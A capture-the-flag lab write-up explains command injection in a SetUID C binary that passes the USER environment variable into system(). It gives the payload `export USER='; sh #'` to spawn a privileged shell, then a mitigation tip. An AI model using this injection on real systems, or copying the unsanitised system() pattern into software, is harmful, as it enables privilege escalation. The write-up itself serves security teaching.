

---
### 🧩 Challenge Insight

> This level contains a SetUID binary that constructs and executes a command using unfiltered input from the `USER` environment variable.  
> Your task is to identify how this leads to command injection and gain shell access as `flag02`.

**Login:** `level02 : level02`  
**Binary path:** `/home/flag02`

---

### 🧠 Code Review

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

💡 **Observation:**  
The program pulls the value of `$USER` from the environment and inserts it directly into a shell command — without sanitization.

This results in **command injection** vulnerability when the input contains shell metacharacters (`;`, `&&`, etc.).

---

### 🎯 Objective

Inject a malicious payload into the `USER` environment variable to spawn a shell as `flag02`, then retrieve the flag.

---

### 🔧 Exploitation Flow

#### 🧪 Step 1: Prepare the payload

```bash
export USER='; sh #'
```

- `;` ends the current command.
    
- `sh` spawns a new shell.
    
- `#` comments out the remaining string.
    

#### 🛠 Step 2: Execute the vulnerable binary

```bash
cd /home/flag02
./flag02
```

This runs:

```
/bin/echo ; sh # is cool
```

Effectively giving us a shell running with the **EUID of flag02**.

---

### 🎯 Step 3: Capture the flag

```bash
getflag
```

✅ **Output:**

```
You have successfully executed getflag on a target account
```

---

### 📚 Lessons Learned

This level is a textbook example of **shell command injection via environment variables**. Trusting user-controlled inputs like `$USER` in shell command construction leads to direct system compromise.

🔐 **Mitigation Tip:**  
Avoid `system()` when possible. Use `execve()` with argument vectors or sanitize inputs before passing to shell commands.

---
